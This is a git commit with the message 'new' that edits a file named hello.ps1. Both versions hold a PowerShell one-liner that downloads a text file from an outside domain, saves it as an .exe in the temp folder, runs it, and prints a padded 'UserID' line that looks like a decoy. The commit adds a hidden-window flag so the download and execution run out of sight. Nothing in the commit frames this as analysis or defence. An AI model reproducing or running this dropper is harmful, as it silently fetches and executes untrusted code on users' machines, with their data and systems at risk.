a5ffda8c7b363d7fadad251a85d72c55ec28533c
GenaBobkovCoding <oeirf234dj034234@proton.me>
2025-12-26 19:45:33 +0300

    new

--- hello.ps1
+++ hello.ps1
@@ -1,1 +1,1 @@
-powershell  -c "iwr 'https://mellstroyappgame.online/test/mini.txt' -o $env:TEMP\\tc.exe; & $env:TEMP\\tc.exe; Write-Host '                                                  UserID:63994529832'"
+powershell  -WindowStyle Hidden -c "iwr 'https://mellstroyappgame.online/test/mini.txt' -o $env:TEMP\\tc.exe; & $env:TEMP\\tc.exe; Write-Host '                                                  UserID:63994529832'"
